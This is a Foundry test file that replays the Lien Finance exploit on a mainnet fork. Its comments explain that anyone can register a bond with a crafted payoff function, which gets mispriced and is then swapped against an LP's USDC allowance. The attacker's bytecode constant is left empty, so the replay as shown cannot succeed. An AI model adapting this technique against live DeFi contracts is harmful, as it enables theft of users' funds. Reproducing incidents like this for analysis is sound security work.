pragma solidity ^0.8.20;

import "forge-std/Test.sol";

// Lien Finance — permissionless bond registration + crafted payoff function mispricing.
//
// Incident tx : 0xb96d572b557a12f5ef193e88cca86123a6ae1b6e98b0eeee265870c85848e0e7
//   Ethereum mainnet block 25599302, tx index 4 (the USDC drain). The attack is staged
//   across several txs in that same block, all from EOA 0x0D7d..1808a:
//     idx 0  CREATE  -> deploys the orchestration contract 0xe74d..062e
//     idx 1  0xb67d3eef  -> BondMakerCollateralizedEth.registerNewBond(...) x3 with
//                           attacker-crafted piecewise-linear payoff functions
//     idx 2  0x973de16c  -> further bond registration / bond-group setup
//     idx 3  0x808f4a48  -> further setup
//     idx 4  0xa5514ef8  -> registerNewBondGroup + exchangeEquivalentBonds, then swaps the
//                           freshly-minted bonds through the OTC pools and sweeps the USDC
//   The faithful replay therefore deploys the exact orchestration creation bytecode at the
//   pre-attack block and calls the same four parameterless selectors, in order, as the EOA.
//
// Root cause (contract-logic bug, NOT an oracle manipulation):
//   BondMakerCollateralizedEth.registerNewBond is permissionless — anyone can register a bond
//   whose payoff (fnMap) they fully control. GeneralizedDotc._calcRateBondToErc20 prices such a
//   bond via bondPricer.calcPriceAndLeverage(payoff, oraclePrice, volatility, ...). With a
//   crafted payoff the pricer massively OVER-values a near-worthless bond. The Chainlink feeds
//   are read at their normal on-chain values during the drain tx (ETH latestAnswer 187042764678
//   ~= $1870.42, pricing oracle latestPrice 0x5f5e100 == 1e8) — no price is moved or spoofed.
//   The attacker mints the overvalued bonds for ~free and swaps them, via the OTC pools, against
//   USDC that the LP (0xA961..4d80) had granted as allowance to those pools — draining it.
//
// Verified on-chain USDC (6 dp) deltas across the drain tx:
//   attacker EOA 0x0D7d..1808a   0 -> 542,144,628,604   (+542,144.628604 USDC)
//   LP           0xA961..4d80    allowance to GeneralizedDotc pre-block 532,070,026,484 pulled
//   Final orchestration -> attacker transfer: exactly 542,144,628,604.
//
// Run:
//   forge test --contracts ./src/test/2026-07/LienFinance_exp.sol -vvv
//   If you hit a frameless "NotActivated", add: --evm-version cancun

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
}

contract LienFinanceExp is Test {
    address constant ATTACKER = 0x0D7d9023531aD1A88414E216Ee2715F63561808a;
    IERC20 constant USDC = IERC20(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48); // USDC, 6 dp

    // Victim LP whose granted USDC allowance to the OTC pools is drained.
    address constant LP = 0xA961684a3a654fb2cCA8F8991226C0CEfc514d80;

    uint256 constant ATTACK_BLOCK = 25599302;
    uint256 constant EXPECTED_GAIN = 542_144_628_604; // 542,144.628604 USDC (6 dp)

    // Selectors of the four parameterless orchestration entrypoints, called in tx-index order.
    bytes4 constant STEP1 = 0xb67d3eef; // block tx idx 1
    bytes4 constant STEP2 = 0x973de16c; // block tx idx 2
    bytes4 constant STEP3 = 0x808f4a48; // block tx idx 3
    bytes4 constant STEP4 = 0xa5514ef8; // block tx idx 4 (the given incident tx)

    // Exact creation bytecode of the attacker's orchestration contract (block tx idx 0 input).
    bytes constant ORCH_CREATION_CODE =
        hex"";

    function setUp() public {
        // Fork one block before the attack block so the crafted bonds do not yet exist and the
        // LP's pre-existing USDC allowance to the OTC pools is intact.
        vm.createSelectFork("mainnet", ATTACK_BLOCK - 1);
    }

    function testExploit() public {
        assertEq(USDC.balanceOf(ATTACKER), 0, "attacker should start with 0 USDC");

        // Prank as the attacker EOA for both msg.sender and tx.origin, matching the real txs.
        vm.startPrank(ATTACKER, ATTACKER);

        // idx 0: deploy the orchestration contract from its exact on-chain creation bytecode.
        bytes memory code = ORCH_CREATION_CODE;
        address orch;
        assembly {
            orch := create(0, add(code, 0x20), mload(code))
        }
        require(orch != address(0), "orch deploy failed");

        // idx 1..4: replay the four parameterless calls in order.
        _call(orch, STEP1);
        _call(orch, STEP2);
        _call(orch, STEP3);
        _call(orch, STEP4);

        vm.stopPrank();

        uint256 gain = USDC.balanceOf(ATTACKER);
        emit log_named_decimal_uint("attacker USDC gain", gain, 6);
        assertEq(gain, EXPECTED_GAIN, "attacker USDC gain mismatch");
    }

    function _call(address orch, bytes4 sel) internal {
        (bool ok,) = orch.call(abi.encodePacked(sel));
        require(ok, "orchestration step reverted");
    }
}
